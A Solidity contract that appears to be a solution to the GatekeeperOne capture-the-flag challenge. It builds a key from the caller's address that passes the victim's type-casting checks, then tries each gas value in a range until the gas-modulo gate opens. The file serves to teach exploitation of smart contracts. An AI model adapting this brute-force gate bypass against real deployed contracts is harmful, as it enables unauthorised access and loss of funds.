// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IGatekeeperOne.sol";

contract GatekeeperOneAttack {
    IGatekeeperOne private immutable victimGatekeeperOne;

    constructor(IGatekeeperOne victimGatekeeperOne_) {
        victimGatekeeperOne = victimGatekeeperOne_;
    }

    function attack() external {
        bytes8 key = bytes8(
            uint64(1 + type(uint32).max + uint16(uint160(msg.sender)))
        );
        uint256 mod = 8191;
        uint256 gasBase = 5 * mod;
        uint256 gasLimit = gasBase + mod;

        for (uint256 i = gasBase; i < gasLimit; ) {
            // solhint-disable no-empty-blocks
            try victimGatekeeperOne.enter{ gas: i }(key) returns (bool res) {
                if (res) break;
            } catch Error(string memory) {
                // do nothing
            } catch Panic(uint256) {
                revert("GatekeeperOne: Call Panic error");
            } catch (bytes memory) {
                // do nothing
            }
            // solhint-enable no-empty-blocks

            unchecked {
                ++i;
            }
        }

        require(
            msg.sender == victimGatekeeperOne.entrant(),
            "GatekeeperOne: Attack failed"
        );
    }
}
